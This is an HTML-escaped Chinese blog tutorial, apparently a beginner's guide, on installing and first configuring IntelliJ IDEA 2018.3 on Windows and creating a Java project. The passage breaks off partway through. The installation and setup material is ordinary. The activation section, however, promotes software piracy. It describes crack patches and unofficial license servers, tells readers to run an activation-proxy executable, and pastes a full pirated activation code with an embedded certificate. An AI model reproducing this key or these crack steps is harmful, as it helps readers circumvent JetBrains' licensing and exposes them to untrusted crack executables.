&lt;li&gt;&lt;span&gt;Android Studio：用于开发 android(是google 基于 IDEA 社区版进行迭代的)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;……&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;h2intellijidea&quot;&gt;&lt;span&gt;&lt;strong&gt;2. IntelliJ IDEA 介绍&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;IDEA，全称 IntelliJ IDEA，是 Java 语言的集成开发环境，IDEA 在业界被公认为是最好的 java 开发工具之一，尤其在智能代码助手、代码自动提示、重构、J2EE 支持、Ant、JUnit、CVS 整合、代码审查、创新的 GUI 设计等方面的功能可以说是超常的。&lt;/p&gt;
&lt;p&gt;IntelliJ IDEA 在 2015 年的官网上这样介绍自己：&lt;br/&gt;&lt;code&gt;Excel at enterprise, mobile and web development with Java, Scala and Groovy, with all the latest modern technologies and frameworks available out of the box.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;简明翻译：IntelliJ IDEA 主要用于支持 Java、Scala、Groovy 等语言的开发工具，同时具备支持目前主流的技术和框架，擅长于企业应用、移动应用和 Web 应用的开发。&lt;/p&gt;
&lt;h3 id=&quot;h3idea&quot;&gt;&lt;span&gt;&lt;strong&gt;3. IDEA 的主要功能介绍&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;语言支持上：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0afp.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;其他支持：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0Pa6.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h4ideaeclipse&quot;&gt;&lt;span&gt;&lt;strong&gt;4. IDEA 的主要优势：(相较于 Eclipse 而言)&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;① 强大的整合能力。比如：Git、Maven、Spring 等&lt;br/&gt;② 提示功能的快速、便捷&lt;br/&gt;③ 提示功能的范围广&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0Zel.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;④ 好用的快捷键和代码模板。比如：private static final = psf&lt;br/&gt;⑤ 精准搜索
&lt;h3 id=&quot;h5idea&quot;&gt;&lt;span&gt;&lt;strong&gt;5. IDEA 的下载地址：(官网)&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.jetbrains.com/idea/download/#section=windows&quot; target=&quot;_blank&quot;&gt;https://www.jetbrains.com/idea/download/#section=windows&lt;/a&gt;&lt;br/&gt;IDEA 分为两个版本：旗舰版(Ultimate)和社区版(Community)。&lt;br/&gt;旗舰版收费(限 30 天免费试用)，社区版免费，这和 Eclipse 有很大区别。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0hgJ.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;这里提供了不同操作系统下的两个不同版本的安装文件。&lt;br/&gt;两个不同版本的详细对比，可以参照官网：&lt;br/&gt;　　&lt;a href=&quot;https://www.jetbrains.com/idea/features/editions_comparison_matrix.html&quot; target=&quot;_blank&quot;&gt;https://www.jetbrains.com/idea/features/editions_comparison_matrix.html&lt;/a&gt;
&lt;h3 id=&quot;h6&quot;&gt;&lt;span&gt;&lt;strong&gt;6. 官网提供的详细使用文档&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;　　&lt;a href=&quot;https://www.jetbrains.com/help/idea/meet-intellij-idea.html&quot; target=&quot;_blank&quot;&gt;https://www.jetbrains.com/help/idea/meet-intellij-idea.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;hwindows&quot;&gt;&lt;span&gt;&lt;strong&gt;二、windows 下安装过程&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h1&quot;&gt;&lt;span&gt;&lt;strong&gt;1. 安装前的准备&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h11hardwarerequirements&quot;&gt;&lt;span&gt;&lt;strong&gt;1.1 硬件要求(Hardware requirements)&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;内存：2 GB RAM minimum, 4 GB RAM recommended&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;硬盘：1.5 GB hard disk space + at least 1 GB for caches&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;屏幕：1024x768 minimum screen resolution&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;个人建议配置：内存 8G 或以上，CPU 最好 i5 以上，最好安装块固态硬盘(SSD)，将 IDEA 安装在固态硬盘上，这样流畅度会加快很多。&lt;/p&gt;
&lt;h4 id=&quot;h12softwarerequirements&quot;&gt;&lt;span&gt;&lt;strong&gt;1.2 软件要求(Software requirements)&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;操作系统：Microsoft Windows 10/8/7/Vista/2003/XP (32 or 64 bit)&lt;br/&gt;软件环境：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;JRE 1.8 is bundled with the IntelliJ IDEA distribution. You do not need to install Java on your computer to run IntelliJ IDEA.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;A standalone JDK is required for Java development.&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;注意：这里如果没有安装 JDK 的话，请参考提供的文档《尚硅谷_宋红康_JDK8 的下载/安装/配置.pdf》进行安装配置。&lt;br/&gt;或者参考：&lt;a href=&quot;https://www.cnblogs.com/chenmingjun/p/9941191.html&quot;&gt;win10 64位系统中安装多个jdk版本的切换问题&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;h2&quot;&gt;&lt;span&gt;&lt;strong&gt;2. 具体安装过程&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;双击【ideaIU-2018.3.3.exe】安装文件：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0yQB.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【Next】&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0EIG.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;选择好【文件的安装文件目录】，点击【Next】&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0rX3.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;code&gt;红色箭头&lt;/code&gt;所指向的选项代表根据你的电脑选择对应的位数，这里我选择64位。&lt;br/&gt;&lt;code&gt;绿色箭头&lt;/code&gt;所指向的选项代表关联文件，如果你打钩了，以后你双击电脑上的.java文件就会用它打开，这里推荐选择不关联。。&lt;br/&gt;&lt;code&gt;蓝色箭头&lt;/code&gt;所指向的选项代表是否由JetBrain自动下载一个jre，对于之前没有在电脑上配置jre的人来说强烈建议你在此处勾选上，同一个计算机内可以有多套jre共存并且彼此互相不冲突。每个程序都可以自带jre，当程序运行的时候会寻找对应的jre，寻找时具有优先级，先寻当前目录，再寻父目录，最后在系统的环境变量里寻找。而如果之前在系统的环境变量里已经配置了jre的路径，那不选择倒也不会出很大问题。但如果不确定的话建议在安装JetBrain时选择自动安装一个jre，既方便又不会和已有的环境冲突，多个jre是共存的，无非是占用一点磁盘空间而已。&lt;br/&gt;其余的我们暂不选择&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0CJK.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【安装】&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0e5n.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;等待安装&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0UOE.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【完成】&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0KUQ.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h3&quot;&gt;&lt;span&gt;&lt;strong&gt;3. 安装总结&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;从安装上来看，IntelliJ IDEA 对硬件的要求似乎不是很高。可是实际在开发中其实并不是这样的，因为 IntelliJ IDEA 执行时会有大量的缓存、索引文件，所以如果你正在使用 Eclipse / MyEclipse，想通过 IntelliJ IDEA 来解决计算机的卡、慢等问题，这基本上是不可能的，本质上你应该对自己的硬件设备进行升级。&lt;/p&gt;
&lt;h3 id=&quot;h4&quot;&gt;&lt;span&gt;&lt;strong&gt;4. 查看安装目录结构&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j06cz.png&quot; alt=&quot;&quot;/&gt;&lt;pre&gt;
&lt;code class=&quot;hljs sql&quot;&gt;bin：容器，执行文件和启动参数等&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;help&lt;/span&gt;：快捷键文档和其他帮助文档&lt;br/&gt;jre64：&lt;span class=&quot;hljs-number&quot;&gt;64&lt;/span&gt; 位&lt;span class=&quot;hljs-keyword&quot;&gt;java&lt;/span&gt; 运行环境&lt;br/&gt;lib：idea 依赖的类库&lt;br/&gt;license：各个插件许可&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;plugin&lt;/span&gt;：插件&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中，bin 目录下：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j01g2.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;这里以我的电脑系统(64 位 Windows10，24G 内存)为例，说明一下如何调整 VM 配置文件：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0tQa.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;详解如下：
&lt;pre&gt;
&lt;code class=&quot;hljs markdown&quot;&gt;&lt;span class=&quot;hljs-bullet&quot;&gt;1. &lt;/span&gt;大家根据电脑系统的位数，选择 32 位的 VM 配置文件或者 64 位的 VM 配置文件。&lt;br/&gt;&lt;span class=&quot;hljs-bullet&quot;&gt;2. &lt;/span&gt;32 位操作系统内存不会超过 4G，所以没有多大空间可以调整，建议不用调整了。&lt;br/&gt;&lt;span class=&quot;hljs-bullet&quot;&gt;3. &lt;/span&gt;64 位操作系统中 8G 内存以下的机子或是静态页面开发者是无需修改的。&lt;br/&gt;&lt;span class=&quot;hljs-bullet&quot;&gt;4. &lt;/span&gt;64 位操作系统且内存大于 8G 的，如果你是开发大型项目、Java 项目或是 Android 项目，建议进行修改，常修改的就是下面 3 个参数：&lt;br/&gt;-Xms128m，16 G 内存的机器可尝试设置为 -Xms512m&lt;br/&gt;　　(设置初始的内存数，增加该值可以提高 Java 程序的启动速度)&lt;br/&gt;-Xmx750m，16 G 内存的机器可尝试设置为 -Xmx1500m&lt;br/&gt;　　(设置最大内存数，提高该值，可以减少内存 Garage 收集的频率，提高程序性能)&lt;br/&gt;-XX:ReservedCodeCacheSize=240m，16G 内存的机器可尝试设置为 -XX:ReservedCodeCacheSize=480m&lt;br/&gt;　　(保留代码占用的内存容量)&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h5&quot;&gt;&lt;span&gt;&lt;strong&gt;5. 查看设置目录结构&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;安装完成后没有启动 IntelliJ IDEA 的话，该目录还不会生成。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0IfS.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;这是 IDEA 的各种配置的保存目录。这个设置目录有一个特性，就是你删除掉整个目录之后，重新启动 IntelliJ IDEA 会再自动帮你生成一个全新的默认配置，所以很多时候如果你把 IntelliJ IDEA 配置改坏了，没关系，删掉该目录，一切都会还原到默认。
&lt;h4 id=&quot;h51config&quot;&gt;&lt;span&gt;&lt;strong&gt;5.1 config 目录&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;config 目录是 IntelliJ IDEA 个性化化配置目录，或者说是整个 IDE 设置目录。&lt;code&gt;此目录可看成是最重要的目录，没有之一&lt;/code&gt;，如果你还记得安装篇的介绍的时候，安装新版本的 IntelliJ IDEA 会自动扫描硬盘上的旧配置目录，指的就是该目录。这个目录主要记录了：&lt;code&gt;IDE 主要配置功能&lt;/code&gt;、&lt;code&gt;自定义的代码模板&lt;/code&gt;、&lt;code&gt;自定义的文件模板&lt;/code&gt;、&lt;code&gt;自定义的快捷键&lt;/code&gt;、&lt;code&gt;Project 的 tasks 记录等等个性化的设置&lt;/code&gt;。 比如：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0kXh.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h52system&quot;&gt;&lt;span&gt;&lt;strong&gt;5.2 system 目录&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;system 目录是 IntelliJ IDEA 系统文件目录&lt;/code&gt;，是 IntelliJ IDEA 与开发项目一个桥梁目录，里面主要有：&lt;code&gt;缓存&lt;/code&gt;、&lt;code&gt;索引&lt;/code&gt;、&lt;code&gt;容器文件输出&lt;/code&gt;等等，虽然不是最重要目录，但也是最不可或缺的目录之一。比如：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j08IN.png&quot; alt=&quot;&quot;/&gt;&lt;h2 id=&quot;h&quot;&gt;&lt;span&gt;&lt;strong&gt;三、启动应用后简单配置&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h1-1&quot;&gt;&lt;span&gt;&lt;strong&gt;1. 是否导入已有设置&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;首次启动，会弹出如下的对话框。选择不导入已有的设置，点击【OK】&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0lZH.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;再点击接收用户许可，点击【继续】&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0f9u.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【不发送】&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0ib9.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h2-1&quot;&gt;&lt;span&gt;&lt;strong&gt;2. 设置主题&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;这里根据个人喜好，进行选择，也可以选择跳过(skip all and set defaults)。后面在settings 里也可以再设置主题等。这里选择【Next:Default plugins】&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0xUA.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h3-1&quot;&gt;&lt;span&gt;&lt;strong&gt;3. 设置插件&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;设置 IDEA 中的各种插件，可以选择自定义设置、删除，或者安装本身不存在的插件（比如：支持 Scala 的插件）。这里不设置，后面也可以通过界面菜单栏的 settings 进行设置。&lt;br/&gt;IDEA 插件官方下载地址：https://plugins.jetbrains.com/idea&lt;br/&gt;点击【Next:Featured plugins】&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j02nO.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【Start using IntelliJ IDEA】&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0gce.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h4-1&quot;&gt;&lt;span&gt;&lt;strong&gt;4. 激活&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;IEDA的激活方式有三种，&lt;code&gt;激活码&lt;/code&gt;、&lt;code&gt;激活服务器&lt;/code&gt;和&lt;code&gt;破解补丁&lt;/code&gt;。激活码的话可以去淘宝买，激活的时间基本都是一年；激活服务器的激活到期时间就看服务器的稳定程度和JB官方的是否封杀了；破解补丁是利用程序注入实现激活，最大的好处是可以实现永久激活(2100年过期)，不用老是折腾。&lt;/li&gt;
&lt;li&gt;&lt;span&gt;然后根据提供的激活文档《IDEA2017-2018_激活方法》或百度：idea 破解码，填入：Lisence server 的具体值即可（需要联网）。或者选择 Activation code，根据文档提供的激活码，同样可以激活（不需要联网）。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0RQq.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;补充，对于 IDEA 2017.3 版本，需要按照如下的方式激活：&lt;br/&gt;方式一：&lt;br/&gt;  启动：idea_active_proxy 激活代理.exe&lt;br/&gt;  接着，启动 IDEA：输入 server: http://localhost:8888，然后可以关闭 idea_active_proxy 工具。&lt;br/&gt;方式二：淘宝，你懂的！&lt;br/&gt;  本博主的破解方式（激活码方式）。&lt;br/&gt;附激活码：
&lt;pre&gt;
&lt;code class=&quot;hljs ini&quot;&gt;&lt;span class=&quot;hljs-attr&quot;&gt;5HMBH3TMNB-eyJsaWNlbnNlSWQiOiI1SE1CSDNUTU5CIiwibGljZW5zZWVOYW1lIjoiZGUgZGUiLCJhc3NpZ25lZU5hbWUiOiIiLCJhc3NpZ25lZUVtYWlsIjoiIiwibGljZW5zZVJlc3RyaWN0aW9uIjoiRm9yIGVkdWNhdGlvbmFsIHVzZSBvbmx5IiwiY2hlY2tDb25jdXJyZW50VXNlIjpmYWxzZSwicHJvZHVjdHMiOlt7ImNvZGUiOiJJSSIsInBhaWRVcFRvIjoiMjAxOS0wNi0yMyJ9LHsiY29kZSI6IlJTMCIsInBhaWRVcFRvIjoiMjAxOS0wNi0yMyJ9LHsiY29kZSI6IldTIiwicGFpZFVwVG8iOiIyMDE5LTA2LTIzIn0seyJjb2RlIjoiUkQiLCJwYWlkVXBUbyI6IjIwMTktMDYtMjMifSx7ImNvZGUiOiJSQyIsInBhaWRVcFRvIjoiMjAxOS0wNi0yMyJ9LHsiY29kZSI6IkRDIiwicGFpZFVwVG8iOiIyMDE5LTA2LTIzIn0seyJjb2RlIjoiREIiLCJwYWlkVXBUbyI6IjIwMTktMDYtMjMifSx7ImNvZGUiOiJSTSIsInBhaWRVcFRvIjoiMjAxOS0wNi0yMyJ9LHsiY29kZSI6IkRNIiwicGFpZFVwVG8iOiIyMDE5LTA2LTIzIn0seyJjb2RlIjoiQUMiLCJwYWlkVXBUbyI6IjIwMTktMDYtMjMifSx7ImNvZGUiOiJEUE4iLCJwYWlkVXBUbyI6IjIwMTktMDYtMjMifSx7ImNvZGUiOiJHTyIsInBhaWRVcFRvIjoiMjAxOS0wNi0yMyJ9LHsiY29kZSI6IlBTIiwicGFpZFVwVG8iOiIyMDE5LTA2LTIzIn0seyJjb2RlIjoiQ0wiLCJwYWlkVXBUbyI6IjIwMTktMDYtMjMifSx7ImNvZGUiOiJQQyIsInBhaWRVcFRvIjoiMjAxOS0wNi0yMyJ9LHsiY29kZSI6IlJTVSIsInBhaWRVcFRvIjoiMjAxOS0wNi0yMyJ9XSwiaGFzaCI6Ijk0MDEwNTkvMCIsImdyYWNlUGVyaW9kRGF5cyI6MCwiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ&lt;/span&gt;==-bxO8rTTyr3M7eZ2vDLNED2oFAS+YVV9ql2RvEfJY6FyXPTmtO2I5XpEs9AoYVK5VX+NF7GD41LvCwONzvL69j1fDjVGcU1udj00srdHvuCMnPk1tsiJlnZ2wzmE+AVWKNbMMkzSphlxov5czEzRKG3lMPZ8ffz66+doKgcnef1y5owYdcm4qOCVGtBraBgDPNNM//BUTiCMu51J9B80YFvD2bDmw4pDYl2sorR/&lt;span class=&quot;hljs-number&quot;&gt;530&lt;/span&gt;+&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;Qc4Qrfeurz0YllUD7MEVzNKYh9hSLgWGk4GinB50qifwcqPhI6EF5TGD4oMHEdfCXom0NfO9P8fWwKpGFhfZ4XJml7k3EIAEzYFnau4QJw==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/&lt;span class=&quot;hljs-number&quot;&gt;78&lt;/span&gt;TmVqFl8nOeD5+&lt;span class=&quot;hljs-number&quot;&gt;07&lt;/span&gt;B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/&lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt;vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog==&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;有效期到2019年6月24日&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0qXR.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;到期，请到淘宝购买。
&lt;h2 id=&quot;hjavahelloworld&quot;&gt;&lt;span&gt;&lt;strong&gt;四、创建 Java 工程，运行 Hello World&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h1java&quot;&gt;&lt;span&gt;&lt;strong&gt;1. 创建 Java 工程&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5j0wZr.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;选项详解如下：
&lt;pre&gt;
&lt;code class=&quot;hljs sql&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;Create&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;New&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;Project&lt;/span&gt;：创建一个新的工程。&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;Import&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;Project&lt;/span&gt;：导入一个现有的工程。&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;Open&lt;/span&gt;：打开一个已有工程。比如：可以打开 Eclipse 项目。&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;Check&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;Version&lt;/span&gt; Control：可以通过服务器上的项目地址 &lt;span class=&quot;hljs-keyword&quot;&gt;check&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt; Github 上面项目或其他 Git 托管服务器上的项目。&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里选择 Create New Project，需要明确一下概念：&lt;br/&gt;IntelliJ IDEA 没有类似 Eclipse 的工作空间的概念（Workspaces），最大单元就是Project。&lt;br/&gt;这里可以把 Project 理解为 Eclipse 中的 Workspace。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQ3NY.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;选择指定目录下的 JDK 作为 Project SDK。&lt;br/&gt;如果要创建 Web 工程，则需要勾选上面的 Web Application。如果不需要创建 Web工程的话，则不需要勾选。这里先不勾选，我们只是创建简单的 Java 工程。&lt;br/&gt;其中，选择【New…】，选择 jdk 的安装路径所在位置：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQ99i.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【OK】以后，选择【Next】&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQFnl.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;这里不用勾选。选择【Next】，进入下一个页面：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQDby.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;给创建的工程起一个名字和工程所在位置，点击【finish】&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQBKX.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;点击【OK】即可。
&lt;h3 id=&quot;h2-2&quot;&gt;&lt;span&gt;&lt;strong&gt;2. 设置显示常见的视图&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;调出工具条和按钮组&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQTWJ.png&quot; alt=&quot;&quot;/&gt;&lt;h3 id=&quot;h3-2&quot;&gt;&lt;span&gt;&lt;strong&gt;3. 工程界面展示&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2019/01/18/5jQVmp.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;工程下的 src 类似于 Eclipse 下的 src 目录，用于存放代码。&lt;br/&gt;工程下的.idea 和 project01.iml 文件都是 IDEA 工程特有的。类似于 Eclipse 工程下的.settings、.classpath、.project 文件等。
&lt;h3 id=&quot;h4packageclass&quot;&gt;&lt;span&gt;&lt;strong&gt;4. 创建 Package 和 Class&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;接着在 src 目录下创建一个 package：&lt;/p&gt;
